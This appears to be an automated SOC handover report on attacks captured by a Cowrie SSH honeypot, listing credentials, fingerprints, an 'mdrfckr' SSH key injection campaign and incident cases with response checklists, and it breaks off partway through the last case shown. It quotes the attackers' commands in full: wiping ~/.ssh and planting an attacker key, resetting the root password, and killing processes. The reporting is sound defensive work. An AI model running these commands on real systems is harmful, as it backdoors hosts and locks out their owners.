# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-12 |
| **Generated At** | 2026-05-12T18:03:29Z |
| **Shift Time** | 18:03 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **873** |
| Confirmed Threats | **690** |
| False Positives Filtered | **183** (21.0%) |
| Unique Attacker IPs | **62** |
| Countries of Origin | **24** |
| High Severity Cases | **10** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **863** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **15** |
| Unique Credential Pairs | **10** |
| Unique Usernames | **3** |
| Unique Passwords | **10** |
| Successful Auth Pairs | **10** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 10 |
| `345gs5662d34` | 4 |
| `admin` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 4 |
| `3245gs5662d34` | 3 |
| `` | 1 |
| `admin` | 1 |
| `convergence` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 4 |
| `root` | `3245gs5662d34` | 3 |
| `root` | `` | 1 |
| `admin` | `admin` | 1 |
| `root` | `convergence` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `` | `185.220.101.109` | 2026-05-12T15:07:20 |
| `root` | `convergence` | `102.88.137.80` | 2026-05-12T16:27:24 |
| `root` | `3245gs5662d34` | `102.88.137.80` | 2026-05-12T16:27:30 |
| `root` | `iamthewalrus` | `14.103.114.89` | 2026-05-12T16:52:03 |
| `root` | `pass1` | `158.69.194.208` | 2026-05-12T16:54:42 |
| `root` | `3245gs5662d34` | `158.69.194.208` | 2026-05-12T16:54:47 |
| `root` | `nuc` | `115.178.75.243` | 2026-05-12T17:06:26 |
| `root` | `3245gs5662d34` | `115.178.75.243` | 2026-05-12T17:06:30 |
| `root` | `shankar` | `121.229.191.90` | 2026-05-12T17:07:04 |
| `root` | `alegna` | `183.56.216.153` | 2026-05-12T17:10:12 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **873** |
| Sessions with Fingerprint | **8** |
| Unique HASSH Fingerprints | **8** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 55 |
| Unknown | 2 |
| Go SSH scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 36 | 12 |
| `af8223ac9914...` | libssh-based | 7 | 3 |
| `713bd9cc9355...` | Mirai/variant | 3 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 2 | 2 |
| `087ab61de4f8...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 36 | 12 | Modern SSH client |
| `95420f9d932d...` | libssh | 8 | 6 | — |
| `af8223ac9914...` | libssh | 7 | 3 | libssh-based |
| `713bd9cc9355...` | libssh | 3 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 2 | 2 | Mirai/variant |
| `087ab61de4f8...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `19532158b559...` | libssh | 1 | 1 | Mirai/variant |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:cQvg2wSED2Lp"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.103.114.89`, `121.229.191.90`, `183.56.216.153`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `158.69.194.208`, `102.88.137.80`, `115.178.75.243`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **62** |
| Unique ASNs | **18** |
| High-Risk ASNs | **7** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 42 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS398324` | Censys, Inc. | 1 | HIGH |
| `AS577` | Bell Canada | 1 | LOW |
| `AS58461` | CT HangZhou IDC | 1 | HIGH |
| `AS9318` | SK Broadband Co Ltd | 1 | HIGH |
| `AS14593` | Space Exploration Technologies Corporation | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (10)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-ce0630df4c9f

| Field | Detail |
|---|---|
| **Source IP** | `185.220.101[.]109` |
| **First Seen** | 2026-05-12 15:07 |
| **Last Seen** | 2026-05-12 15:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo "bash --help; ls /proc/1/; cat /proc/1/mounts; cat /proc/cpuinfo; echo __1778598442079603690" | sh, bash --help; ls /proc/1/; cat /proc/1/mounts; cat /proc/cpuinfo; echo __1778598442079603690
` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 15:07:19` | `cowrie.session.connect` |
| `2026-05-12 15:07:19` | `cowrie.client.version` |
| `2026-05-12 15:07:19` | `cowrie.client.kex` |
| `2026-05-12 15:07:20` | `cowrie.login.success` |
| `2026-05-12 15:07:21` | `cowrie.client.size` |
| `2026-05-12 15:07:21` | `cowrie.session.params` |
| `2026-05-12 15:07:22` | `cowrie.command.input` |
| `2026-05-12 15:07:22` | `cowrie.command.input` |
| `2026-05-12 15:07:22` | `cowrie.command.input` |
| `2026-05-12 15:07:27` | `cowrie.log.closed` |
| `2026-05-12 15:07:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.220.101[.]109` to AbuseIPDB if not already reported
- [ ] Block `185.220.101[.]109` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59a45751ef1f

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-12 16:27 |
| **Last Seen** | 2026-05-12 16:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 16:27:23` | `cowrie.session.connect` |
| `2026-05-12 16:27:23` | `cowrie.client.version` |
| `2026-05-12 16:27:23` | `cowrie.client.kex` |
| `2026-05-12 16:27:24` | `cowrie.login.success` |
| `2026-05-12 16:27:25` | `cowrie.session.params` |
| `2026-05-12 16:27:25` | `cowrie.command.input` |
| `2026-05-12 16:27:25` | `cowrie.command.failed` |
| `2026-05-12 16:27:25` | `cowrie.log.closed` |
| `2026-05-12 16:27:25` | `cowrie.session.params` |
| `2026-05-12 16:27:25` | `cowrie.command.input` |
| `2026-05-12 16:27:26` | `cowrie.session.file_download` |
| `2026-05-12 16:27:26` | `cowrie.log.closed` |
| `2026-05-12 16:27:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90cad274b1bd

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-12 16:27 |
| **Last Seen** | 2026-05-12 16:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 16:27:29` | `cowrie.session.connect` |
| `2026-05-12 16:27:29` | `cowrie.client.version` |
| `2026-05-12 16:27:29` | `cowrie.client.kex` |
| `2026-05-12 16:27:30` | `cowrie.login.success` |
| `2026-05-12 16:27:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7420f4258ac5

| Field | Detail |
|---|---|
| **Source IP** | `14.103.114[.]89` |
| **First Seen** | 2026-05-12 16:52 |
| **Last Seen** | 2026-05-12 16:52 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:cQvg2wSED2Lp"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 16:52:02` | `cowrie.session.connect` |
| `2026-05-12 16:52:02` | `cowrie.client.version` |
| `2026-05-12 16:52:02` | `cowrie.client.kex` |
| `2026-05-12 16:52:03` | `cowrie.login.success` |
| `2026-05-12 16:52:03` | `cowrie.session.params` |
| `2026-05-12 16:52:03` | `cowrie.command.input` |
| `2026-05-12 16:52:03` | `cowrie.command.failed` |
| `2026-05-12 16:52:03` | `cowrie.log.closed` |
| `2026-05-12 16:52:03` | `cowrie.session.params` |
| `2026-05-12 16:52:03` | `cowrie.command.input` |
| `2026-05-12 16:52:04` | `cowrie.session.file_download` |
| `2026-05-12 16:52:04` | `cowrie.log.closed` |
| `2026-05-12 16:52:14` | `cowrie.session.params` |
| `2026-05-12 16:52:14` | `cowrie.command.input` |
| `2026-05-12 16:52:14` | `cowrie.log.closed` |
| `2026-05-12 16:52:14` | `cowrie.session.params` |
| `2026-05-12 16:52:14` | `cowrie.command.input` |
| `2026-05-12 16:52:14` | `cowrie.log.closed` |
| `2026-05-12 16:52:15` | `cowrie.session.params` |
| `2026-05-12 16:52:15` | `cowrie.command.input` |
| `2026-05-12 16:52:15` | `cowrie.session.file_download` |
| `2026-05-12 16:52:15` | `cowrie.log.closed` |
| `2026-05-12 16:52:15` | `cowrie.session.params` |
| `2026-05-12 16:52:15` | `cowrie.command.input` |
| `2026-05-12 16:52:15` | `cowrie.log.closed` |
| `2026-05-12 16:52:15` | `cowrie.session.params` |
| `2026-05-12 16:52:15` | `cowrie.command.input` |
| `2026-05-12 16:52:16` | `cowrie.log.closed` |
| `2026-05-12 16:52:16` | `cowrie.session.params` |
| `2026-05-12 16:52:16` | `cowrie.command.input` |
| `2026-05-12 16:52:16` | `cowrie.command.input` |
| `2026-05-12 16:52:16` | `cowrie.log.closed` |
| `2026-05-12 16:52:16` | `cowrie.session.params` |
| `2026-05-12 16:52:16` | `cowrie.command.input` |
| `2026-05-12 16:52:17` | `cowrie.log.closed` |
| `2026-05-12 16:52:17` | `cowrie.session.params` |
| `2026-05-12 16:52:17` | `cowrie.command.input` |
| `2026-05-12 16:52:17` | `cowrie.log.closed` |
| `2026-05-12 16:52:17` | `cowrie.session.params` |
| `2026-05-12 16:52:17` | `cowrie.command.input` |
| `2026-05-12 16:52:17` | `cowrie.log.closed` |
| `2026-05-12 16:52:18` | `cowrie.session.params` |
| `2026-05-12 16:52:18` | `cowrie.command.input` |
| `2026-05-12 16:52:18` | `cowrie.log.closed` |
| `2026-05-12 16:52:18` | `cowrie.session.params` |
| `2026-05-12 16:52:18` | `cowrie.command.input` |
| `2026-05-12 16:52:18` | `cowrie.log.closed` |
| `2026-05-12 16:52:19` | `cowrie.session.params` |
| `2026-05-12 16:52:19` | `cowrie.command.input` |
| `2026-05-12 16:52:19` | `cowrie.log.closed` |
| `2026-05-12 16:52:19` | `cowrie.session.params` |
| `2026-05-12 16:52:19` | `cowrie.command.input` |
| `2026-05-12 16:52:19` | `cowrie.log.closed` |
| `2026-05-12 16:52:20` | `cowrie.session.params` |
| `2026-05-12 16:52:20` | `cowrie.command.input` |
| `2026-05-12 16:52:20` | `cowrie.log.closed` |
| `2026-05-12 16:52:20` | `cowrie.session.params` |
| `2026-05-12 16:52:20` | `cowrie.command.input` |
| `2026-05-12 16:52:20` | `cowrie.log.closed` |
| `2026-05-12 16:52:20` | `cowrie.session.params` |
| `2026-05-12 16:52:20` | `cowrie.command.input` |
| `2026-05-12 16:52:21` | `cowrie.log.closed` |
| `2026-05-12 16:52:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.114[.]89` to AbuseIPDB if not already reported
- [ ] Block `14.103.114[.]89` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e7dad004c7d

| Field | Detail |
|---|---|
| **Source IP** | `158.69.194[.]208` |
| **First Seen** | 2026-05-12 16:54 |
| **Last Seen** | 2026-05-12 16:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 16:54:41` | `cowrie.session.connect` |
| `2026-05-12 16:54:41` | `cowrie.client.version` |
| `2026-05-12 16:54:41` | `cowrie.client.kex` |
| `2026-05-12 16:54:42` | `cowrie.login.success` |
| `2026-05-12 16:54:42` | `cowrie.session.params` |
| `2026-05-12 16:54:42` | `cowrie.command.input` |
| `2026-05-12 16:54:42` | `cowrie.command.failed` |
| `2026-05-12 16:54:43` | `cowrie.log.closed` |
| `2026-05-12 16:54:43` | `cowrie.session.params` |
| `2026-05-12 16:54:43` | `cowrie.command.input` |
| `2026-05-12 16:54:43` | `cowrie.session.file_download` |
| `2026-05-12 16:54:43` | `cowrie.log.closed` |
| `2026-05-12 16:54:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.69.194[.]208` to AbuseIPDB if not already reported
- [ ] Block `158.69.194[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96da7eae70ad

| Field | Detail |
|---|---|
| **Source IP** | `158.69.194[.]208` |
| **First Seen** | 2026-05-12 16:54 |
| **Last Seen** | 2026-05-12 16:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 16:54:46` | `cowrie.session.connect` |
| `2026-05-12 16:54:46` | `cowrie.client.version` |
| `2026-05-12 16:54:46` | `cowrie.client.kex` |
| `2026-05-12 16:54:47` | `cowrie.login.success` |
| `2026-05-12 16:54:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.69.194[.]208` to AbuseIPDB if not already reported
- [ ] Block `158.69.194[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12a8d2e392f2

| Field | Detail |
|---|---|
| **Source IP** | `115.178.75[.]243` |
| **First Seen** | 2026-05-12 17:06 |
| **Last Seen** | 2026-05-12 17:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 17:06:26` | `cowrie.session.connect` |
| `2026-05-12 17:06:26` | `cowrie.client.version` |
| `2026-05-12 17:06:26` | `cowrie.client.kex` |
| `2026-05-12 17:06:26` | `cowrie.login.success` |
| `2026-05-12 17:06:27` | `cowrie.session.params` |
| `2026-05-12 17:06:27` | `cowrie.command.input` |
| `2026-05-12 17:06:27` | `cowrie.command.failed` |
| `2026-05-12 17:06:27` | `cowrie.log.closed` |
| `2026-05-12 17:06:27` | `cowrie.session.params` |
| `2026-05-12 17:06:27` | `cowrie.command.input` |
| `2026-05-12 17:06:27` | `cowrie.session.file_download` |
| `2026-05-12 17:06:27` | `cowrie.log.closed` |
| `2026-05-12 17:06:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.178.75[.]243` to AbuseIPDB if not already reported
- [ ] Block `115.178.75[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e03b9e129d0c

| Field | Detail |
|---|---|
| **Source IP** | `115.178.75[.]243` |
| **First Seen** | 2026-05-12 17:06 |
| **Last Seen** | 2026-05-12 17:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 17:06:29` | `cowrie.session.connect` |
| `2026-05-12 17:06:29` | `cowrie.client.version` |
| `2026-05-12 17:06:30` | `cowrie.client.kex` |
| `2026-05-12 17:06:30` | `cowrie.login.success` |
| `2026-05-12 17:06:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.178.75[.]243` to AbuseIPDB if not already reported
- [ ] Block `115.178.75[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8032ba6f0616

| Field | Detail |
|---|---|
| **Source IP** | `121.229.191[.]90` |
| **First Seen** | 2026-05-12 17:07 |
| **Last Seen** | 2026-05-12 17:07 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:d4Ks2nGnF5jY"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 17:07:03` | `cowrie.session.connect` |
| `2026-05-12 17:07:03` | `cowrie.client.version` |
| `2026-05-12 17:07:03` | `cowrie.client.kex` |
| `2026-05-12 17:07:04` | `cowrie.login.success` |
| `2026-05-12 17:07:04` | `cowrie.session.params` |
| `2026-05-12 17:07:04` | `cowrie.command.input` |
| `2026-05-12 17:07:04` | `cowrie.command.failed` |
| `2026-05-12 17:07:04` | `cowrie.log.closed` |
| `2026-05-12 17:07:05` | `cowrie.session.params` |
| `2026-05-12 17:07:05` | `cowrie.command.input` |
| `2026-05-12 17:07:05` | `cowrie.session.file_download` |
| `2026-05-12 17:07:05` | `cowrie.log.closed` |
| `2026-05-12 17:07:22` | `cowrie.session.params` |
| `2026-05-12 17:07:22` | `cowrie.command.input` |
| `2026-05-12 17:07:22` | `cowrie.log.closed` |
| `2026-05-12 17:07:23` | `cowrie.session.params` |
| `2026-05-12 17:07:23` | `cowrie.command.input` |
| `2026-05-12 17:07:23` | `cowrie.log.closed` |
| `2026-05-12 17:07:23` | `cowrie.session.params` |
| `2026-05-12 17:07:23` | `cowrie.command.input` |
| `2026-05-12 17:07:23` | `cowrie.session.file_download` |
| `2026-05-12 17:07:23` | `cowrie.log.closed` |
| `2026-05-12 17:07:23` | `cowrie.session.params` |
| `2026-05-12 17:07:23` | `cowrie.command.input` |
| `2026-05-12 17:07:23` | `cowrie.log.closed` |
| `2026-05-12 17:07:24` | `cowrie.session.params` |
| `2026-05-12 17:07:24` | `cowrie.command.input` |
| `2026-05-12 17:07:24` | `cowrie.log.closed` |
| `2026-05-12 17:07:24` | `cowrie.session.params` |
| `2026-05-12 17:07:24` | `cowrie.command.input` |
| `2026-05-12 17:07:24` | `cowrie.command.input` |
| `2026-05-12 17:07:24` | `cowrie.log.closed` |
| `2026-05-12 17:07:25` | `cowrie.session.params` |
| `2026-05-12 17:07:25` | `cowrie.command.input` |
| `2026-05-12 17:07:25` | `cowrie.log.closed` |
| `2026-05-12 17:07:25` | `cowrie.session.params` |
